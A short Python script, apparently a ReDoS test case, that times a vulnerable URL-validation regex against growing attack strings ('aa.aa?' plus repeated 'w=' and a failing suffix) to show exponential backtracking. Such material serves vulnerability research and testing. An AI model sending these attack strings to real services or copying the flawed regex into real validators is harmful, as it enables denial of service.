# 8292
# ^((https|http)://)?(www.)?(([a-zA-Z0-9\-]{2,})\.)+([a-zA-Z0-9\-]{2,4})(/[\w\.]{0,})*((\?)(([\w\%]{0,}=[\w\%]{0,}&?)|[\w]{0,})*)?$
# EXPONENT
# nums:4
# EXPONENT AttackString:"aa.aa?"+"w="*16+"! _1_EOD(i4)"

import re
from time import perf_counter

regex = """^((https|http)://)?(www.)?(([a-zA-Z0-9\-]{2,})\.)+([a-zA-Z0-9\-]{2,4})(/[\w\.]{0,})*((\?)(([\w\%]{0,}=[\w\%]{0,}&?)|[\w]{0,})*)?$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "aa.aa?" + "w=" * i * 1 + "! _1_EOD(i4)"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")